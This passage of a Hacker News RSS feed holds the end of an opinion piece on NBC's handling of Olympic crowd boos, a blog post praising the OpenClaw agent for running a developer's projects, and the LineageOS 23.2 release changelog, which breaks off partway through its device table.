liveblogged it. <a href="https://x.com/donkoclock/status/2019887497891696788" data-link-name="in body link">Fans clipped it</a>. Within minutes, multiple versions of the same happening were circulating online – some with boos, some without – turning what might once have been a routine production call into a case study in information asymmetry.</p><p>For its part, <a href="https://awfulannouncing.com/nbc/denies-editing-jd-vance-boos-olympics-opening-ceremony-audio.html" data-link-name="in body link">NBC has denied</a> editing the crowd audio, although it is difficult to resolve why the boos so audible in the stadium and on other broadcasts were absent for US viewers. But in a broader sense, it is becoming harder, not easier, to curate reality when the rest of the world is holding up its own camera angles. And that raises an uncomfortable question as the United States moves toward hosting two of the largest sporting events on the planet: the 2026 men’s World Cup and the 2028 Los Angeles Olympics.</p><p>If a US administration figure is booed at the Olympics in Los Angeles, or a World Cup match in New Jersey or Dallas, will American domestic broadcasts simply mute or avoid mentioning the crowd audio? If so, what happens when the world feed, or a foreign broadcaster, shows something else entirely? What happens when 40,000 phones in the stadium upload their own version in real time?</p><p>The risk is not just that viewers will see through it. It is that attempts to manage the narrative will make American broadcasters look less credible, not more. Because the audience now assumes there is always another angle. Every time a broadcaster makes that trade – credibility for insulation – it is a trade audiences eventually notice.</p><p>There is also a deeper structural pressure behind decisions like this. The Trump era has been defined in part by sustained <a href="https://www.theguardian.com/us-news/2024/nov/15/trump-sues-media-outlets-bias" data-link-name="in body link">hostility toward media institutions</a>. Broadcasters do not operate in a vacuum; they operate inside regulatory environments, political climates and corporate risk calculations. When presidents and their allies openly threaten or target networks, it is naive to pretend that has no downstream effect on editorial choices – especially in high-stakes live broadcasts tied to billion-dollar rights deals.</p><p>But there is a difference between contextual pressure and visible reality distortion. When global audiences can compare feeds in real time, the latter begins to resemble something else entirely: not editorial judgment, but narrative management. Which is why comparisons to Soviet-style state-controlled broadcasting models – once breathless rhetorical exaggerations – are starting to feel less hyperbolic.</p><p>The irony is that the Olympics themselves are built around the idea that sport can exist alongside political tension without pretending it does not exist. The International Olympic Committee’s own language – athletes should not be punished for governments’ actions – implicitly acknowledges that governments are part of the Olympic theater whether organizers like it or not.</p><p>Friday night illustrated that perfectly. American athletes were cheered, their enormous contingent given one of the most full-throated receptions of the night. The political emissaries were not universally welcomed. Both things can be true at once. Crowd dissent is not a failure of the Olympic ideal. In open societies, it is part of how public sentiment is expressed. Attempting to erase one side of that equation risks flattening reality into something audiences no longer trust. And if Milan was a warning shot, Los Angeles is the main event.</p><p>Since Donald Trump’s first term, American political coverage around sport has fixated on the micro-moments: Was the president booed or cheered? Did the broadcast show it? Did he attend or skip events likely to produce hostile crowds? The discourse has often felt like a Rorschach test, filtered through partisan interpretation and selective clips.</p><p>The LA Olympics will be something else entirely. There is no hiding from an opening ceremony. No ducking a stadium when the Olympic Charter requires the host country’s head of state to officially declare the Games open. No controlling how 200 international broadcasters carry the moment.</p><p>If Trump is still in the White House in mid-2028, one month after his 82nd birthday and in the thick of another heated US presidential campaign, he will stand in front of a global television audience as a key part of the opening ceremony. He will do so in California, in a political environment far less friendly than many domestic sporting venues he has appeared in over the past decade. And he will do it in a city synonymous with the political opposition, potentially in the back yard of <a href="https://www.theguardian.com/us-news/2025/oct/26/gavin-newsom-2028-presidential-race" data-link-name="in body link">the Democratic presidential candidate</a>.</p><p>There will be some cheers. There will almost certainly be boos. There will be everything in between. And there will be no way to make them disappear. The real risk for American broadcasters is not that dissent will be visible. It is that audiences will start assuming anything they do not show is being hidden. In an era when trust in institutions is already fragile, that is a dangerous place to operate from.</p><p>The Olympics have always been political, whether through boycotts, protests, symbolic gestures or crowd reactions. What has changed is not the politics. It is the impossibility of containing the optics.</p><p>Milan may ultimately be remembered as a small moment – a few seconds of crowd noise during a long ceremony. But it also felt like a preview of the next phase of global sport broadcasting: one where narrative control is shared, contested and instantly verifiable. The world is watching. And this time, it is also recording.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenClaw is changing my life (185 pts)]]></title>
            <link>https://reorx.com/blog/openclaw-is-changing-my-life/</link>
            <guid>46931805</guid>
            <pubDate>Sun, 08 Feb 2026 06:21:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://reorx.com/blog/openclaw-is-changing-my-life/">https://reorx.com/blog/openclaw-is-changing-my-life/</a>, See on <a href="https://news.ycombinator.com/item?id=46931805">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>I want to share some thoughts on my recent experience with OpenClaw. Over the past year, I’ve been actively using Claude Code for development. Many people believed AI could already assist with programming—seemingly replacing programmers—but I never felt it brought any revolutionary change to the way I work.</p><p>Sure, agentic coding tools like Claude Code and Cursor have made writing code easier, but at the end of the day, I was still the one writing. It might look like the AI is doing the work, but “writing” is a broad term—writing is execution. As the person making code happen, I’m the one writing code. Whether I’m editing line by line, copy-pasting, or telling an AI what I want and letting it finish—it’s still me “writing.” My role as the programmer responsible for turning code into reality hasn’t changed.</p><p>My productivity did improve, but for any given task, I still had to jump into the project, set up the environment, open my editor and Claude Code terminal. I was still the operator; the only difference was that instead of typing code manually, I was typing intent into a chat box. That only changed one dimension. Testing, debugging—most of it still fell on me. There was some change, sure, but it wasn’t mature, and there was no fundamental shift. I still had to stay deeply involved and monitor everything. And it was exactly this deep involvement that kept me stuck in the role of code executor.</p><p>Then OpenClaw came along, and everything changed.</p><p>I once discussed with my wife: in the age of AI, should you aim to be a “super individual” or build a “super team”? My answer is: become a “super manager.” A super individual who can juggle multiple threads and coordinate numerous AI tools is essentially demonstrating great management skills. Being a super individual means using AI tools to lift yourself from a basic executor to a higher-level one, and eventually into a manager. So even if you’re going the super individual route, you need solid management awareness and methods to keep everything running smoothly.</p><p>OpenClaw gave me the chance to become that super manager. After a few rounds of practice, I found that I could completely step away from the programming environment and handle an entire project’s development, testing, deployment, launch, and usage—all through chatting on my phone. That’s something Claude Code simply can’t do, or rather, it was never designed to.</p><p>As a general-purpose agent, OpenClaw interacts through messaging apps via voice, accurately understands what I mean, works independently for extended periods, and has solid memory—it can persist the methods and rules it picks up during work, gradually evolving through use. These are the capabilities that make it the real turning point for replacing me as the code executor. The biggest change is this: I just need to express my intent, and it automatically creates the project, writes up a plan for me to review. I can discuss changes with it by voice, and then it executes—even directing Claude Code to do the actual coding.</p><p>It replaced the “me” that used to write code, truly stepping into the programmer role and freeing me to act as a manager. A manager shouldn’t get bogged down in the specifics—they should focus on the higher-level, abstract work. That’s what management really is. You could even flip it around: you’re only a true manager when you can get things done purely through communication. Before, Claude Code alone couldn’t get you there. But when you have a dedicated machine running 24/7, set up with all your tools, and an agent that understands your intent sitting at the computer writing and debugging code for you—that’s when things truly change. That’s when the revolution arrives.</p><p>This is the biggest shift OpenClaw has brought—it completely transformed my workflow. Whether it’s personal or commercial projects, I can step back and look at things from a management perspective. It’s like having a programmer who’s always on standby, ready to hop into meetings, discuss ideas, take on tasks, report back, and adjust course at any time. It can even juggle multiple roles, like having several programmers working on different projects simultaneously. Meanwhile, I can be the tech lead keeping tabs on specific project progress, or the project manager steering the overall schedule and direction.</p><p>This has truly freed up my productivity, letting me pursue so many ideas I couldn’t move forward on before. I feel like my life genuinely changed at this moment. I used to have way too many ideas but no way to build them all on my own—they just kept piling up. But now, everything is different.</p><p>It’s like I suddenly have a team, achieving the dream scenario I always imagined: owning a company, hiring people to bring my ideas to life, while I just focus on product design and planning. I’m closer than ever to that dream state. Before, that required serious capital. Without money, you can’t hire anyone, and you can’t just be the idea person. Unless you’re some trust fund kid doing it for fun, you’re stuck bouncing between “indie developer who wants to build multiple projects” and “solo hustler just trying to survive.”</p><p>But now, I can finally break out of that trap and move toward actually having a team. It keeps all my projects moving forward at any time. It’s not perfect yet, but I’ve taken the first step.</p><p>Thank you, OpenClaw. Thank you, AGI—for me, it’s already here. The gears of fate are turning in directions I never imagined.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[LineageOS 23.2 (129 pts)]]></title>
            <link>https://lineageos.org/Changelog-31/</link>
            <guid>46931595</guid>
            <pubDate>Sun, 08 Feb 2026 05:33:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lineageos.org/Changelog-31/">https://lineageos.org/Changelog-31/</a>, See on <a href="https://news.ycombinator.com/item?id=46931595">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

    <h2 id="232-halftime-release">23.2 Halftime Release</h2>

<p>Hello again!</p>

<p>The last few months have been quite the endeavor, as we have been busy rebasing and updating LineageOS, on not one but two large AOSP releases. Nevertheless, we have persevered and are pleased to present LineageOS 23.2.</p>

<h3 id="changes-in-aosp">Changes in AOSP</h3>

<p>Over the last few years, AOSP has been shifting to a quarterly release cadence, meaning that new features and bug fixes are released every three months. Google recently announced that AOSP will be shifting to a biannual release cadence, meaning that the latest fixes and features will drop every six months now.</p>

<p>Android Security Bulletins will still be released, and picked to all supported LineageOS versions monthly.</p>

<p>While this change does not significantly alter our development process, it is worth noting that LineageOS will adopt a six-month cadence, with work on each new point release starting every six months.</p>

<h3 id="whats-changed">What’s Changed</h3>

<p>When you install or upgrade to this release, you will immediately notice the new UI and color scheme. This is because LineageOS is now officially using Google’s Material Expressive design system which focuses on expressive colors, and emotive design elements.</p>

<p>In addition, you may notice the updated UI of the Quick Settings panel, which now contains fully customizable tiles, which in our opinion are much more pleasant to use! In this release, you will also find an expanded dark theme, and more powerful file utilities surrounding private spaces.</p>

<h3 id="updated-apps">Updated Apps</h3>

<p>This release mainly focuses on the Material Expressive design language, and in the interest of keeping up with these guidelines, we have been working diligently at updating the default apps to Material Expressive.</p>

<h4 id="updater">Updater</h4>

<p>Contributor pjgowtham has been hard at work on updating the Updater app, and when those changes are merged, you will be treated to a completely redesigned UI, improved update management, delightful animations and various bugs fixed. It wasn’t quite ready for the 23.2 launch, but will be soon, so be on the lookout!</p>

<h4 id="other-apps">Other apps</h4>

<p>In addition to the Updater, Twelve (the default music app), Deskclock and ExactCalculator have received Material 3 Expressive updates, which brings them into the modern era. Stay tuned for similar updates to the other default apps!</p>

<h3 id="development-tools">Development Tools</h3>

<p>In the previous release changelog, we teased some development tools that were in the midst of being reviewed. These have now been merged, and developers have some new tools in their arsenal:</p>

<ul>
  <li><code>beautify_rro.py</code>: Beautifies multiple existing RROs given a directory.</li>
  <li><code>generate_rro.py</code>: Extracts RROs from a prebuilt overlays directory.</li>
  <li><code>update_certificates.py</code>: Updates app certificates given a stock dump directory.</li>
  <li><code>decompile_cil.py</code>: Extracts sepolicy rules from a prebuilt SELinux image.</li>
  <li><code>extract_aconfig.py</code>: Extracts config files from stock dumps.</li>
  <li><code>match_manifest_tarball.py</code>: Matches kernel (or source) tarball releases against public Git history.</li>
</ul>

<h3 id="leadership-changes">Leadership Changes</h3>

<p>After roughly seven years with Lineage, and another five with CyanogenMod, we’re sad to announce Rashed is stepping away from the project to spend more time offline. We wish him the best!</p>

<p>We’re also glad to announce that the current directors group have voted Nolen Johnson (npjohnson) in as the ninth director. Welcome!</p>

<h3 id="deprecations">Deprecations</h3>

<p>Overall, we feel that the 23.2 branch has reached feature and stability parity with 23.0 and is
ready for initial release.</p>

<p>We will still allow new LineageOS 21 submissions to be forked to the organization, but we will continue our policy of no longer
allowing newly submitted LineageOS 21 devices to ship.</p>

<p>LineageOS 23.2 will launch building for a decent selection of devices, with additional devices to
come as they meet the requirements specified by the
<a href="https://github.com/LineageOS/charter/blob/main/device-support-requirements.md">Charter</a> and are
marked as ready for builds by their maintainer.</p>

<h3 id="upgrading-to-lineageos-232">Upgrading to LineageOS 23.2</h3>

<p>To upgrade, please follow the upgrade guide for your device by clicking on it <a href="https://wiki.lineageos.org/devices/">here</a> and then on “Upgrade to a higher version of LineageOS”.</p>

<p>If you’re coming from an unofficial build, you need to follow the good ole’ install guide for your
device, just like anyone else looking to
install LineageOS for the first time. These can be found at the same place
<a href="https://wiki.lineageos.org/devices/">here</a> by clicking on your device and then on “Installation”.</p>

<p>Please note that if you’re currently on an official build, you <em>DO NOT</em> need to wipe your device,
unless your device’s wiki page specifically dictates otherwise, as is needed for some devices with
massive changes, such as a repartition.</p>

<h3 id="developers-developers-developers">Developers, Developers, Developers</h3>

<p>Or, in this case, maintainers, maintainers, maintainers. We want your device submissions!</p>

<p>If you’re a developer and would like to submit your device for officials, it’s easier than ever.
Just follow the instructions <a href="https://wiki.lineageos.org/submitting_device.html">here</a>.</p>

<p>The above also applies to people looking to bring back devices that were at one point official but
are no longer supported - seriously - even if it’s not yet completely compliant, submit it! Maybe
we can help you complete it.</p>

<p>After you submit, within generally a few weeks, but in most cases a week, you’ll receive some
feedback on your device submission; and if it’s up to par, you’ll be invited to our communications
instances and your device will be forked to LineageOS’s official repositories.</p>

<p>Don’t have the knowledge to maintain a device, but want to contribute to the platform? We have lots
of other things you can contribute to.
For instance, our apps suite is always looking for new people to help
<a href="https://wiki.lineageos.org/how-to/contributing-apps/">improve them</a>, or you can
<a href="https://wiki.lineageos.org/contributing_wiki">contribute to the wiki</a> by adding
more useful information &amp; documentation.
<a href="https://wiki.lineageos.org/usinggerrit-howto.html">Gerrit</a> is always open for submissions! Once
you’ve contributed a few things, send an email to devrel(at)lineageos.org detailing them, and we’ll
get you in the loop.</p>

<p>Also, if you sent a submission that didn’t get a response in the last few months, please follow up,
we’ve swapped providers again!</p>

<h3 id="generic-targets">Generic Targets</h3>

<p>We’ve talked about these before, but these are important, so we will cover them again.</p>

<p>Although we’ve had buildable generic targets since 2019, to make LineageOS more accessible to
developers, and really anyone interested in giving LineageOS a try, we’ve documented how to use
them in conjunction with the Android
<a href="https://wiki.lineageos.org/emulator.html">Emulator/Android Studio</a>!</p>

<p>Additionally, similar targets can now be used to build GSI in mobile, Android TV configurations,
and Android Automotive making LineageOS more accessible than ever to
devices using Google’s
<a href="https://android-developers.googleblog.com/2017/05/here-comes-treble-modular-base-for.html">Project Treble</a>.
We won’t be providing official builds for these targets, due to the fact the user experience varies
entirely based on how well the device manufacturer complied with Treble’s requirements, but feel
free to go build them yourself and give it a shot!</p>

<p>Please note that Android 12 (and by proxy all later Android versions) diverged GSI and Emulator
targets. Emulator targets reside in <code>lineage_sdk_$arch</code>, while GSI targets reside in
<code>lineage_gsi_$arch</code>.</p>

<p>Additionally, experimental targets now exist for QEMU-based virtual machine software (libvirt,
UTM, etc). Instructions on building and utilizing these targets can be found on
<a href="https://wiki.lineageos.org/libvirt-qemu">the Wiki</a>.</p>

<h3 id="translations">Translations</h3>

<p>Bilingual? Trilingual? Anything-lingual?</p>

<p>If you think you can help translate LineageOS to a different language, jump over to
<a href="https://wiki.lineageos.org/how-to/translate">our wiki</a> and have a go!
If your language is not supported natively in Android, reach out to us on Crowdin and we’ll take
the necessary
steps to include your language.
For instance, LineageOS is the first Android custom distribution that has complete support
for the Welsh (Cymraeg) language thanks to its community of translators.</p>

<p>Please, contribute to translations only if you are reasonably literate in the target language;
poor translations waste both our time and yours.</p>

<h3 id="build-roster">Build roster</h3>

<h4 id="added-232-devices">Added 23.2 devices</h4>

<table>
  <thead>
    <tr>
      <th>Device name</th>
      <th>Wiki</th>
      <th>Maintainers</th>
      <th>Moved from</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ASUS ZenFone 8</td>
      <td><a href="https://wiki.lineageos.org/devices/sake">sake</a></td>
      <td>DD3Boh, mikooomich</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>F(x)tec Pro¹ X</td>
      <td><a href="https://wiki.lineageos.org/devices/pro1x">pro1x</a></td>
      <td>BadDaemon, bgcngm, mccreary, npjohnson, qsnc, tdm</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Fairphone 4</td>
      <td><a href="https://wiki.lineageos.org/devices/FP4">FP4</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Fairphone 5</td>
      <td><a href="https://wiki.lineageos.org/devices/FP5">FP5</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 4 XL</td>
      <td><a href="https://wiki.lineageos.org/devices/coral">coral</a></td>
      <td>mikeioannina, npjohnson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 4</td>
      <td><a href="https://wiki.lineageos.org/devices/flame">flame</a></td>
      <td>mikeioannina, npjohnson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 4a 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/bramble">bramble</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 4a</td>
      <td><a href="https://wiki.lineageos.org/devices/sunfish">sunfish</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 5</td>
      <td><a href="https://wiki.lineageos.org/devices/redfin">redfin</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 5a</td>
      <td><a href="https://wiki.lineageos.org/devices/barbet">barbet</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 6 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/raven">raven</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 6</td>
      <td><a href="https://wiki.lineageos.org/devices/oriole">oriole</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 6a</td>
      <td><a href="https://wiki.lineageos.org/devices/bluejay">bluejay</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 7 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/cheetah">cheetah</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 7</td>
      <td><a href="https://wiki.lineageos.org/devices/panther">panther</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 7a</td>
      <td><a href="https://wiki.lineageos.org/devices/lynx">lynx</a></td>
      <td>mikeioannina, niclimcy</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 8 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/husky">husky</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 8</td>
      <td><a href="https://wiki.lineageos.org/devices/shiba">shiba</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 8a</td>
      <td><a href="https://wiki.lineageos.org/devices/akita">akita</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 9 Pro Fold</td>
      <td><a href="https://wiki.lineageos.org/devices/comet">comet</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 9 Pro XL</td>
      <td><a href="https://wiki.lineageos.org/devices/komodo">komodo</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 9 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/caiman">caiman</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 9</td>
      <td><a href="https://wiki.lineageos.org/devices/tokay">tokay</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel 9a</td>
      <td><a href="https://wiki.lineageos.org/devices/tegu">tegu</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel Fold</td>
      <td><a href="https://wiki.lineageos.org/devices/felix">felix</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Google Pixel Tablet</td>
      <td><a href="https://wiki.lineageos.org/devices/tangorpro">tangorpro</a></td>
      <td>LuK1337, mikeioannina, npjohnson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Lenovo Z5 Pro GT</td>
      <td><a href="https://wiki.lineageos.org/devices/heart">heart</a></td>
      <td>themard, optionaltoast</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Lenovo Z6 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/zippo">zippo</a></td>
      <td>Lucchetto, themard, einargednochsson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola defy 2021</td>
      <td><a href="https://wiki.lineageos.org/devices/bathena">bathena</a></td>
      <td>Deivid Ignacio Parra (Deivid21), Francisco Sanchez (Fraaxius)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 20 pro</td>
      <td><a href="https://wiki.lineageos.org/devices/pstar">pstar</a></td>
      <td>npjohnson, SGCMarkus</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 20</td>
      <td><a href="https://wiki.lineageos.org/devices/berlin">berlin</a></td>
      <td>npjohnson, SGCMarkus</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 2021</td>
      <td><a href="https://wiki.lineageos.org/devices/berlna">berlna</a></td>
      <td>SyberHexen</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 2024</td>
      <td><a href="https://wiki.lineageos.org/devices/avatrn">avatrn</a></td>
      <td>elginsk8r</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 30 fusion</td>
      <td><a href="https://wiki.lineageos.org/devices/tundra">tundra</a></td>
      <td>themard, electimon</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 30 neo</td>
      <td><a href="https://wiki.lineageos.org/devices/miami">miami</a></td>
      <td>marcost2</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 30</td>
      <td><a href="https://wiki.lineageos.org/devices/dubai">dubai</a></td>
      <td>themard, sb6596, Demon000</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge 40 pro / Motorola moto X40 / Motorola edge+ (2023)</td>
      <td><a href="https://wiki.lineageos.org/devices/rtwo">rtwo</a></td>
      <td>sgcmarkus, themard</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola edge s / Motorola moto g100</td>
      <td><a href="https://wiki.lineageos.org/devices/nio">nio</a></td>
      <td>dianlujitao</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto e7 plus / Lenovo K12</td>
      <td><a href="https://wiki.lineageos.org/devices/guam">guam</a></td>
      <td>Rajin Gangadharan (GRajin), Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g 5G - 2024</td>
      <td><a href="https://wiki.lineageos.org/devices/fogo">fogo</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g power 2021</td>
      <td><a href="https://wiki.lineageos.org/devices/borneo">borneo</a></td>
      <td>Syed Fawwaz Hussain (Fazwalrus), Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g stylus 5G (2022)</td>
      <td><a href="https://wiki.lineageos.org/devices/milanf">milanf</a></td>
      <td>AnierinBliss</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g stylus 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/denver">denver</a></td>
      <td>Vivekachooz</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g10 / Motorola moto g10 power / Lenovo K13 Note</td>
      <td><a href="https://wiki.lineageos.org/devices/capri">capri</a></td>
      <td>Deivid Ignacio Parra (Deivid21), Sultanahamer</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g200 5G / Motorola Edge S30</td>
      <td><a href="https://wiki.lineageos.org/devices/xpeng">xpeng</a></td>
      <td>themard, rogers2602</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g30 / Lenovo K13 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/caprip">caprip</a></td>
      <td>mikeioannina, Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g32</td>
      <td><a href="https://wiki.lineageos.org/devices/devon">devon</a></td>
      <td>Dhina17, mikeioannina, Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g34 5G / Motorola moto g45 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/fogos">fogos</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g42</td>
      <td><a href="https://wiki.lineageos.org/devices/hawao">hawao</a></td>
      <td>Dhina17, mikeioannina, Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g52</td>
      <td><a href="https://wiki.lineageos.org/devices/rhode">rhode</a></td>
      <td>Dhina17, mikeioannina, tomoms, Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g82 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/rhodep">rhodep</a></td>
      <td>AnandSuresh02, sevenrock</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g84 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/bangkk">bangkk</a></td>
      <td>mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g9 play / Motorola moto g9 / Lenovo K12 Note</td>
      <td><a href="https://wiki.lineageos.org/devices/guamp">guamp</a></td>
      <td>DelightReza, Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Motorola moto g9 power / Lenovo K12 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/cebu">cebu</a></td>
      <td>Deivid Ignacio Parra (Deivid21)</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Nothing Phone (1)</td>
      <td><a href="https://wiki.lineageos.org/devices/Spacewar">Spacewar</a></td>
      <td>zlewchan, ko_ko_konb</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Nothing Phone (2)</td>
      <td><a href="https://wiki.lineageos.org/devices/Pong">Pong</a></td>
      <td>chandu078</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>Nubia Mini 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/TP1803">TP1803</a></td>
      <td>ArianK16a, npjohnson</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 11 5G</td>
      <td><a href="https://wiki.lineageos.org/devices/salami">salami</a></td>
      <td>bgcngm</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 12</td>
      <td><a href="https://wiki.lineageos.org/devices/waffle">waffle</a></td>
      <td>chandu078</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 12R</td>
      <td><a href="https://wiki.lineageos.org/devices/aston">aston</a></td>
      <td>inferno0230</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 13</td>
      <td><a href="https://wiki.lineageos.org/devices/dodge">dodge</a></td>
      <td>bgcngm, chandu078, dianlujitao, ItsVixano</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 13R</td>
      <td><a href="https://wiki.lineageos.org/devices/giulia">giulia</a></td>
      <td>chandu078, madmax</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 7 Pro / OnePlus 7 Pro (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/guacamole">guacamole</a></td>
      <td>LuK1337, elginsk8r</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 7</td>
      <td><a href="https://wiki.lineageos.org/devices/guacamoleb">guacamoleb</a></td>
      <td>shantanu-sarkar</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 7T / OnePlus 7T (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/hotdogb">hotdogb</a></td>
      <td>LuK1337, Onelots</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 7T Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/hotdog">hotdog</a></td>
      <td>qsnc</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 8 / OnePlus 8 (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/instantnoodle">instantnoodle</a></td>
      <td>jabashque</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 8 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/instantnoodlep">instantnoodlep</a></td>
      <td>LuK1337</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 8T / OnePlus 8T (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/kebab">kebab</a></td>
      <td>LuK1337, mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 9 / OnePlus 9 (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/lemonade">lemonade</a></td>
      <td>mikeioannina, tangalbert919, ZVNexus</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 9 Pro / OnePlus 9 Pro (T-Mobile)</td>
      <td><a href="https://wiki.lineageos.org/devices/lemonadep">lemonadep</a></td>
      <td>LuK1337, bgcngm, mikeioannina</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 9R</td>
      <td><a href="https://wiki.lineageos.org/devices/lemonades">lemonades</a></td>
      <td>DaemonMCR, Tuan Anh</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus 9RT</td>
      <td><a href="https://wiki.lineageos.org/devices/martini">martini</a></td>
      <td>basamaryan</td>
      <td>23.0</td>
    </tr>
    <tr>
      <td>OnePlus Ace 3 Pro</td>
      <td><a href="https://wiki.lineageos.org/devices/corvette">corvette</a></td>
